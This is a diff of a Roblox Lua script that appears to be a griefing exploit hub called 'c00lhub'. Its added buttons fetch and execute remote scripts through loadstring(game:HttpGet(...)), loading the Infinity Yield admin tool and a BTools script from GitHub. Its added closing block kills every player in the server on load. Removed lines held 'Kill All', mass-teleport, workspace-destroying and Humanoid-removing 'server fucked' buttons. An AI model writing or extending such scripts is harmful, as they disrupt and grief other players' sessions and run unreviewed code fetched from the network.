+	local Lighting = game:GetService("Lighting")
+
+	-- Função para alternar entre dia e noite com transição rápida
+	local function dayNightCycle()
+		while true do
+			-- Definir a hora para o dia (6 AM)
+			Lighting:SetMinutesAfterMidnight(360) -- 6 AM
+			wait(1) -- Aguarda 1 segundo no dia
+
+			-- Transição do dia para a noite (6 PM)
+			for minute = 360, 1080 do
+				Lighting:SetMinutesAfterMidnight(minute)
+				wait(1 / 720) -- Transição de 720 minutos em 1 segundo
+			end
+
+			wait(1) -- Aguarda 1 segundo na noite
+
+			-- Transição da noite para o dia (6 AM)
+			for minute = 1080, 360, -1 do
+				Lighting:SetMinutesAfterMidnight(minute)
+				wait(1 / 720) -- Transição de 720 minutos em 1 segundo
+			end
+
+			wait(1) -- Aguarda 1 segundo no início do novo ciclo
+		end
+	end
+
+	-- Inicia o ciclo de dia e noite
+	dayNightCycle()
+end)
+
+GirarWorkspace.Name = "GirarWorkspace"
+GirarWorkspace.Parent = GuiInicial
+GirarWorkspace.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+GirarWorkspace.BorderColor3 = Color3.fromRGB(255, 255, 255)
+GirarWorkspace.Position = UDim2.new(0.729820609, 0, 0.724310756, 0)
+GirarWorkspace.Size = UDim2.new(0, 168, 0, 55)
+GirarWorkspace.Font = Enum.Font.Unknown
+GirarWorkspace.Text = "Girar o workspace"
+GirarWorkspace.TextColor3 = Color3.fromRGB(255, 255, 255)
+GirarWorkspace.TextScaled = true
+GirarWorkspace.TextSize = 14.000
+GirarWorkspace.TextWrapped = true
+GirarWorkspace.MouseButton1Down:Connect(function()
 	-- Script para girar todas as partes e modelos na diagonal, exceto os modelos com Humanoid
 
 	-- Definir a velocidade de rotação para os eixos X e Y (ajuste conforme necessário)
@@ -422,344 +600,167 @@ spin.MouseButton1Down:Connect(function()
 	girarPartesEModelsNaDiagonal()
 end)
 
-terrorMod.Name = "terrorMod"
-terrorMod.Parent = commands
-terrorMod.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
-terrorMod.BorderColor3 = Color3.fromRGB(0, 0, 0)
-terrorMod.BorderSizePixel = 3
-terrorMod.Position = UDim2.new(0.0376719721, 0, 0.210748315, 0)
-terrorMod.Size = UDim2.new(0, 113, 0, 106)
-terrorMod.Font = Enum.Font.Unknown
-terrorMod.Text = "terrorMod"
-terrorMod.TextColor3 = Color3.fromRGB(0, 0, 0)
-terrorMod.TextScaled = true
-terrorMod.TextSize = 14.000
-terrorMod.TextWrapped = true
-terrorMod.MouseButton1Down:Connect(function()
-	local Lighting = game:GetService("Lighting")
-	local SoundService = game:GetService("SoundService")
-	local RunService = game:GetService("RunService")
-
-	-- 🔥 Configurações de Luz para um Ambiente de Terror 🔥 --
-	Lighting.Brightness = 0.1 -- Deixa mais escuro
-	Lighting.OutdoorAmbient = Color3.fromRGB(30, 0, 0) -- Luz externa vermelha
-	Lighting.Ambient = Color3.fromRGB(10, 0, 0) -- Luz ambiente escura
-	Lighting.FogColor = Color3.fromRGB(20, 0, 0) -- Cor da neblina
-	Lighting.FogEnd = 150 -- Intensidade da neblina
-
-	-- 🔥 Adiciona uma Skybox Sombria 🔥 --
-	local skybox = Lighting:FindFirstChild("TerrorSky")
-	if not skybox then
-		skybox = Instance.new("Sky")
-		skybox.Name = "TerrorSky"
-		skybox.Parent = Lighting
-	end
-
-	skybox.SkyboxBk = "rbxassetid://158118263" -- Fundo
-	skybox.SkyboxDn = "rbxassetid://158118263" -- Baixo
-	skybox.SkyboxFt = "rbxassetid://158118263" -- Frente
-	skybox.SkyboxLf = "rbxassetid://158118263" -- Esquerda
-	skybox.SkyboxRt = "rbxassetid://158118263" -- Direita
-	skybox.SkyboxUp = "rbxassetid://158118263" -- Cima
-
-	-- 🔥 Adiciona um Som Ambiente Assustador 🔥 --
-	local terrorSound = SoundService:FindFirstChild("TerrorAmbience")
-	if not terrorSound then
-		terrorSound = Instance.new("Sound")
-		terrorSound.Name = "TerrorAmbience"
-		terrorSound.SoundId = "rbxassetid://907280763" -- Som assustador
-		terrorSound.Looped = true
-		terrorSound.Volume = 2
-		terrorSound.Parent = SoundService
-		terrorSound:Play()
-	end
-
-	-- 🔥 Efeito de Flashing na Luz 🔥 --
-	RunService.Heartbeat:Connect(function()
-		Lighting.Brightness = 0.1 + math.random() * 0.05 -- Pequena variação para efeito sinistro
-	end)
-
-	print("🎃 MODO DE TERROR ATIVADO! 🎃")
+btools.Name = "btools"
+btools.Parent = GuiInicial
+btools.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+btools.BorderColor3 = Color3.fromRGB(255, 255, 255)
+btools.Position = UDim2.new(0.729820609, 0, 0.501253128, 0)
+btools.Size = UDim2.new(0, 168, 0, 55)
+btools.Font = Enum.Font.Unknown
+btools.Text = "Btools"
+btools.TextColor3 = Color3.fromRGB(255, 255, 255)
+btools.TextScaled = true
+btools.TextSize = 14.000
+btools.TextWrapped = true
+btools.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/MarbleMakerMaster/AdvancedBToolsSource/main/adv_btools.lua"))()
 end)
 
-jumscare.Name = "jumscare"
-jumscare.Parent = commands
-jumscare.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
-jumscare.BorderColor3 = Color3.fromRGB(0, 0, 0)
-jumscare.BorderSizePixel = 3
-jumscare.Position = UDim2.new(0.65037483, 0, 0.393660635, 0)
-jumscare.Size = UDim2.new(0, 113, 0, 106)
-jumscare.Font = Enum.Font.Unknown
-jumscare.Text = "jumpscare"
-jumscare.TextColor3 = Color3.fromRGB(0, 0, 0)
-jumscare.TextScaled = true
-jumscare.TextSize = 14.000
-jumscare.TextWrapped = true
-jumscare.MouseButton1Down:Connect(function()
-	-- Referências ao serviço de sons e o LocalPlayer
-	local player = game.Players.LocalPlayer
-	local soundService = game:GetService("SoundService")
-
-	-- Criando a ScreenGui temporária
-	local screenGui = Instance.new("ScreenGui")
-	screenGui.Name = "TemporaryGui"
-	screenGui.Parent = player:FindFirstChildOfClass("PlayerGui") or player:WaitForChild("PlayerGui")
-	screenGui.IgnoreGuiInset = true
-
-	-- Criando a ImageLabel dentro da ScreenGui
-	local imageLabel = Instance.new("ImageLabel")
-	imageLabel.Name = "ImageLabel"
-	imageLabel.Size = UDim2.new(1, 0, 1, 0)  -- A ImageLabel vai ocupar a tela inteira
-	imageLabel.Position = UDim2.new(0, 0, 0, 0)  -- A posição é no canto superior esquerdo da tela
-	imageLabel.Image = "rbxassetid://10459746711"  -- Substitua pelo ID da textura desejada
-	imageLabel.Parent = screenGui
-
-	-- Adicionando o áudio ao jogo
-	local sound = Instance.new("Sound")
-	sound.SoundId = "rbxassetid://158118263"  -- ID do áudio atualizado
-	sound.Looped = true  -- Define o áudio para tocar em loop
-	sound.Parent = soundService
-	sound:Play()
-
-	-- Função para remover a ScreenGui após 10 segundos
-	task.delay(10, function()
-		sound:Stop()  -- Para o áudio
-		screenGui:Destroy()  -- Remove a ScreenGui
-		sound:Destroy()  -- Remove o som após parar
-	end)
+InfinityYield.Name = "InfinityYield"
+InfinityYield.Parent = GuiInicial
+InfinityYield.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+InfinityYield.BorderColor3 = Color3.fromRGB(255, 255, 255)
+InfinityYield.Position = UDim2.new(0.729820609, 0, 0.26566416, 0)
+InfinityYield.Size = UDim2.new(0, 168, 0, 55)
+InfinityYield.Font = Enum.Font.Unknown
+InfinityYield.Text = "Infinity Yield"
+InfinityYield.TextColor3 = Color3.fromRGB(255, 255, 255)
+InfinityYield.TextScaled = true
+InfinityYield.TextSize = 14.000
+InfinityYield.TextWrapped = true
+InfinityYield.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
 end)
 
-Destroy.Name = "Destroy"
-Destroy.Parent = commands
-Destroy.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
-Destroy.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Destroy.BorderSizePixel = 3
-Destroy.Position = UDim2.new(0.65037483, 0, 0.210748315, 0)
-Destroy.Size = UDim2.new(0, 113, 0, 106)
-Destroy.Font = Enum.Font.Unknown
-Destroy.Text = "Destroy"
-Destroy.TextColor3 = Color3.fromRGB(0, 0, 0)
-Destroy.TextScaled = true
-Destroy.TextSize = 14.000
-Destroy.TextWrapped = true
-Destroy.MouseButton1Down:Connect(function()
-	-- Cria a BaseParte
-	local baseParte = Instance.new("Part")
-	local SpawnPoint = Instance.new("SpawnLocation")
-	SpawnPoint.Parent = game.Workspace
-	SpawnPoint.Name = "SpawnPoint"
-	SpawnPoint.Position = Vector3.new(0, 5, 0) -- Ajuste a posição do SpawnPoint conforme necessário
-	baseParte.Name = "BaseParte"
-	baseParte.Size = Vector3.new(2048, 16, 2048) -- Defina o tamanho conforme necessário
-	baseParte.Position = Vector3.new(0, -8, 0) -- Defina a posição conforme necessário
-	baseParte.Anchored = true -- Para manter a BaseParte no lugar
-	baseParte.Parent = game.Workspace -- Adiciona a BaseParte ao Workspace
+c00lkidd.Name = "c00lkidd:)"
+c00lkidd.Parent = FramePrincipal
+c00lkidd.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+c00lkidd.BorderColor3 = Color3.fromRGB(255, 255, 255)
+c00lkidd.Position = UDim2.new(-0.0239390638, 0, -0.0221870039, 0)
+c00lkidd.Size = UDim2.new(0, 157, 0, 145)
 
-	-- Função para remover partes que não são a BaseParte
-	for _, obj in pairs(game.Workspace:GetDescendants()) do
-		if obj:IsA("Part") and obj.Name ~= "BaseParte" then
-			obj:Destroy()
-		end
-	end
+ImageLabel.Parent = c00lkidd
+ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.BackgroundTransparency = 1.000
+ImageLabel.BorderColor3 = Color3.fromRGB(255, 255, 255)
+ImageLabel.Position = UDim2.new(-0.00504570268, 0, -0.00311489752, 0)
+ImageLabel.Rotation = -20.000
+ImageLabel.Size = UDim2.new(0, 157, 0, 145)
+ImageLabel.Image = "http://www.roblox.com/asset/?id=81917071074086"
+ImageLabel.Name = "Cleitinho"
 
-	print("BaseParte criada e outras partes removidas!")
+fecharFrame.Name = "fecharFrame"
+fecharFrame.Parent = FramePrincipal
+fecharFrame.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+fecharFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
+fecharFrame.Position = UDim2.new(0.898803055, 0, 0.0269413628, 0)
+fecharFrame.Size = UDim2.new(0, 79, 0, 58)
+fecharFrame.Font = Enum.Font.Unknown
+fecharFrame.Text = "X"
+fecharFrame.TextColor3 = Color3.fromRGB(255, 255, 255)
+fecharFrame.TextScaled = true
+fecharFrame.TextSize = 14.000
+fecharFrame.TextWrapped = true
+fecharFrame.MouseButton1Down:Connect(function()
+	FramePrincipal.Visible = false
 end)
 
-Teleporteall.Name = "Teleporte all"
-Teleporteall.Parent = commands
-Teleporteall.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
-Teleporteall.BorderColor3 = Color3.fromRGB(0, 0, 0)
-Teleporteall.BorderSizePixel = 3
-Teleporteall.Position = UDim2.new(0.65037483, 0, 0.0301224049, 0)
-Teleporteall.Size = UDim2.new(0, 113, 0, 106)
-Teleporteall.Font = Enum.Font.Unknown
-Teleporteall.Text = "Teleporte all"
-Teleporteall.TextColor3 = Color3.fromRGB(0, 0, 0)
-Teleporteall.TextScaled = true
-Teleporteall.TextSize = 14.000
-Teleporteall.TextWrapped = true
-Teleporteall.MouseButton1Down:Connect(function()
-	local Players = game:GetService("Players")
-	local owner = Players.LocalPlayer -- Quem executou o script
+c00lhub.Name = "c00lhub"
+c00lhub.Parent = FramePrincipal
+c00lhub.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+c00lhub.BorderColor3 = Color3.fromRGB(255, 255, 255)
+c00lhub.Position = UDim2.new(0.183895543, 0, 0.00950871594, 0)
+c00lhub.Size = UDim2.new(0, 410, 0, 90)
 
-	if owner and owner.Character and owner.Character.PrimaryPart then
-		local targetPosition = owner.Character.PrimaryPart.Position -- Posição do executor
-
-		for _, player in ipairs(Players:GetPlayers()) do
-			if player ~= owner and player.Character and player.Character.PrimaryPart then
-				player.Character:SetPrimaryPartCFrame(CFrame.new(targetPosition + Vector3.new(0, 5, 0))) -- Teleporta um pouco acima
-			end
-		end
-	else
-		warn("🚨 O executor não tem um personagem válido para teleporte!")
-	end
-end)
-
-killAll.Name = "killAll"
-killAll.Parent = commands
-killAll.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
-killAll.BorderColor3 = Color3.fromRGB(0, 0, 0)
-killAll.BorderSizePixel = 3
-killAll.Position = UDim2.new(0.0376719721, 0, 0.809786379, 0)
-killAll.Size = UDim2.new(0, 113, 0, 106)
-killAll.Font = Enum.Font.Unknown
-killAll.Text = "Kill All"
-killAll.TextColor3 = Color3.fromRGB(0, 0, 0)
-killAll.TextScaled = true
-killAll.TextSize = 14.000
-killAll.TextWrapped = true
-killAll.MouseButton1Down:Connect(function()
-	-- Script para matar todos os jogadores
-	for _, player in pairs(game.Players:GetPlayers()) do
-		-- Verifica se o jogador tem um personagem e se o personagem está vivo
-		if player.Character and player.Character:FindFirstChild("Humanoid") then
-			player.Character.Humanoid.Health = 0 -- Define a saúde do jogador para 0, matando-o
-		end
-	end
-end)
-
-UIAspectRatioConstraint.Parent = MadeByenthony_50388
-UIAspectRatioConstraint.AspectRatio = 1.674
-
-serversfuckeds.Name = "servers fuckeds"
-serversfuckeds.Parent = MadeByenthony_50388
-serversfuckeds.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-serversfuckeds.BorderColor3 = Color3.fromRGB(0, 0, 0)
-serversfuckeds.BorderSizePixel = 0
-serversfuckeds.Position = UDim2.new(0, 0, 0.893955469, 0)
-serversfuckeds.Size = UDim2.new(0, 380, 0, 100)
-
-serverFucked.Name = "serverFucked"
-serverFucked.Parent = serversfuckeds
-serverFucked.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
-serverFucked.BorderColor3 = Color3.fromRGB(0, 0, 0)
-serverFucked.BorderSizePixel = 3
-serverFucked.Position = UDim2.new(0, 0, 0.340000004, 0)
-serverFucked.Size = UDim2.new(0, 139, 0, 50)
-serverFucked.Font = Enum.Font.Unknown
-serverFucked.Text = "server fucked"
-serverFucked.TextColor3 = Color3.fromRGB(0, 0, 0)
-serverFucked.TextScaled = true
-serverFucked.TextSize = 14.000
-serverFucked.TextWrapped = true
-serverFucked.MouseButton1Down:Connect(function()
-	local Lighting = game:GetService("Lighting")
-	local Players = game:GetService("Players")
-
-	-- Função para simular a visão daltônica
-	local function setDaltonicMode()
-		-- Criando o efeito de ColorCorrection
-		local colorCorrection = Instance.new("ColorCorrectionEffect")
-		local colorCorrection2 = Instance.new("ColorCorrectionEffect")
-		colorCorrection.Enabled = true
-
-		-- Alterando as cores para simular um tipo de daltonismo
-		-- Essa combinação é apenas um exemplo e pode ser ajustada conforme necessário
-		colorCorrection.TintColor = Color3.fromRGB(99, 239, 255) -- Colocando um tom amarelado
-		colorCorrection.Saturation = -1  -- Reduzindo bastante a saturação para uma visão mais apagada
-		colorCorrection.Contrast =  100000002004087734272    -- Aumentando o contraste para intensificar a diferença nas cores
-		colorCorrection.Brightness = 0.1   -- Aumentando o brilho para deixar a cena mais iluminada
-		colorCorrection2.TintColor = Color3.fromRGB(255, 0, 4) -- Colocando um tom amarelado
-		colorCorrection2.Saturation = -1  -- Reduzindo bastante a saturação para uma visão mais apagada
-		colorCorrection2.Contrast =  100000002004087734272    -- Aumentando o contraste para intensificar a diferença nas cores
-		colorCorrection2.Brightness = 0.1 
-
-		-- Aplica o efeito de daltonismo no serviço de iluminação
-		colorCorrection.Parent = Lighting
-	end
-
-	-- Função para remover o Humanoid de todos os jogadores
-	local function removeHumanoid()
-		for _, player in pairs(Players:GetPlayers()) do
-			local character = player.Character
-			if character and character:FindFirstChild("Humanoid") then
-				local humanoid = character:FindFirstChild("Humanoid")
-				humanoid:Destroy()  -- Remove o Humanoid
-			end
-		end
-	end
-
-	-- Chamando as funções
-	removeHumanoid()
-	setDaltonicMode()
-end)
-
-horror.Name = "horror"
-horror.Parent = serversfuckeds
-horror.BackgroundColor3 = Color3.fromRGB(0, 85, 255)
-horror.BorderColor3 = Color3.fromRGB(0, 0, 0)
-horror.BorderSizePixel = 3
-horror.Position = UDim2.new(0.495356023, 0, 0.340000004, 0)
-horror.Size = UDim2.new(0, 139, 0, 50)
-horror.Font = Enum.Font.Unknown
-horror.Text = "horror"
-horror.TextColor3 = Color3.fromRGB(0, 0, 0)
-horror.TextScaled = true
-horror.TextSize = 14.000
-horror.TextWrapped = true
-horror.MouseButton1Down:Connect(function()
-	local Players = game:GetService("Players")
-
-	-- Função para criar o efeito
-	local function addAttachmentToHead(character)
-		-- Aguardar até que a Head exista no personagem
-		local head = character:FindFirstChild("Head") or character:WaitForChild("Head", 5) 
-		if head then
-			-- Criar um Attachment se não existir
-			local attachment = head:FindFirstChild("CustomAttachment")
-			if not attachment then
-				attachment = Instance.new("Attachment")
-				attachment.Name = "CustomAttachment"
-				attachment.Parent = head
-			end
-
-			-- Criar um ParticleEmitter se não existir
-			local particle = attachment:FindFirstChild("CustomParticle")
-			if not particle then
-				particle = Instance.new("ParticleEmitter")
-				particle.Name = "CustomParticle"
-				particle.Parent = attachment
-
-				-- Configurações da Partícula (Agora bem visível)
-				particle.TimeScale = 1  
-				particle.Size = NumberSequence.new({ -- Tamanho dinâmico da partícula
-					NumberSequenceKeypoint.new(0, 1), 
-					NumberSequenceKeypoint.new(1, 5)
-				})
-				particle.Rate = 15  -- Quantidade de partículas por segundo
-				particle.Texture = "rbxassetid://YOUR_TEXTURE_ID" -- Insira um ID de textura aqui
-				particle.Lifetime = NumberRange.new(2, 3) -- Tempo de vida das partículas
-				particle.Speed = NumberRange.new(3, 6) -- Velocidade das partículas
-				particle.Color = ColorSequence.new(Color3.fromRGB(255, 0, 0)) -- Cor Vermelha
-				particle.Transparency = NumberSequence.new(0.5) -- Parcialmente visível
-
-				print("ParticleEmitter adicionado para " .. character.Name)
-			end
-		end
-	end
-
-	-- Aplicar para jogadores existentes
-	for _, player in pairs(Players:GetPlayers()) do
-		if player.Character then
-			addAttachmentToHead(player.Character)
-		end
-	end
-
-	-- Adicionar para novos jogadores
-	Players.PlayerAdded:Connect(function(player)
-		player.CharacterAdded:Connect(function(character)
-			addAttachmentToHead(character)
-		end)
-	end)
-end)
-
-TextLabel.Parent = serversfuckeds
-TextLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 127)
-TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
+TextLabel.Parent = c00lhub
+TextLabel.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.BorderColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel.BorderSizePixel = 0
-TextLabel.Position = UDim2.new(0, 0, -0.230000004, 0)
-TextLabel.Size = UDim2.new(0, 380, 0, 50)
+TextLabel.Position = UDim2.new(0.0196183361, 0, 0.257052273, 0)
+TextLabel.Size = UDim2.new(0, 219, 0, 56)
 TextLabel.Font = Enum.Font.Unknown
-TextLabel.Text = "servers fuckeds"
-TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.TextSize = 39.000
+TextLabel.Text = "c00lhub"
+TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+TextLabel.TextScaled = true
+TextLabel.TextSize = 14.000
+TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 0, 0)
+TextLabel.TextWrapped = true
+TextLabel.FontFace = Font.new("rbxasset://11322590111/Fuzzy-Bubbles?pageNumber=1&pagePosition=1", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+
+TextLabel_2.Parent = c00lhub
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Position = UDim2.new(0.325090945, 0, -0.0682690069, 0)
+TextLabel_2.Size = UDim2.new(0, 268, 0, 56)
+TextLabel_2.Font = Enum.Font.Unknown
+TextLabel_2.Text = "made by enthony_50388"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 0, 0)
+TextLabel_2.TextScaled = true
+TextLabel_2.TextSize = 100.000
+TextLabel_2.TextStrokeColor3 = Color3.fromRGB(255, 0, 0)
+TextLabel_2.TextWrapped = true
+TextLabel_2.FontFace = Font.new("rbxasset://11322590111/Fuzzy-Bubbles?pageNumber=1&pagePosition=22", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
+
+local TweenService = game:GetService("TweenService")
+local Player = game.Players.LocalPlayer
+local ImageLabel = Player:WaitForChild("PlayerGui"):WaitForChild("C00lhubV1"):WaitForChild("FramePrincipal"):WaitForChild("c00lkidd:)"):FindFirstChild("Cleitinho") -- Substitua pelo nome real
+
+if ImageLabel then
+	local tweenInfo = TweenInfo.new(
+		1, -- Duração da animação (1 segundo)
+		Enum.EasingStyle.Sine, -- Tipo de animação suave
+		Enum.EasingDirection.InOut, -- Direção da animação
+		-1, -- Repetir infinitamente
+		true -- Inverter o movimento
+	)
+
+	local goal = {Rotation = 20} -- Define a rotação máxima para um lado
+	local tween = TweenService:Create(ImageLabel, tweenInfo, goal)
+	tween:Play()
+else
+	warn("ImageLabel não encontrado!")
+end
+
+local Players = game:GetService("Players")
+
+-- Função para matar todos os jogadores
+local function killAllPlayers()
+	for _, player in pairs(Players:GetPlayers()) do
+		if player.Character and player.Character:FindFirstChild("Humanoid") then
+			player.Character:FindFirstChild("Humanoid"):TakeDamage(player.Character.Humanoid.Health) -- Mata o jogador
+		end
+	end
+end
+
+-- Função para dar vida infinita aos jogadores
+local function giveInfiniteHealth(player)
+	player.CharacterAdded:Connect(function(character)
+		local humanoid = character:WaitForChild("Humanoid")
+
+		-- Define a vida do humanoide como infinita
+		humanoid.HealthChanged:Connect(function()
+			if humanoid.Health <= 0 then
+				humanoid.Health = humanoid.MaxHealth -- Restaura a vida do jogador
+			end
+		end)
+
+		-- Garantir que a vida seja definida como infinita ao iniciar o jogo
+		humanoid.Health = humanoid.MaxHealth
+	end)
+end
+
+-- Mata todos os jogadores
+killAllPlayers()
+
+-- Dá vida infinita para os jogadores que entrarem ou renascerem
+Players.PlayerAdded:Connect(function(player)
+	giveInfiniteHealth(player)
+end)
+
+-- Dá vida infinita aos jogadores que já estão no jogo
+for _, player in pairs(Players:GetPlayers()) do
+	giveInfiniteHealth(player)
+end
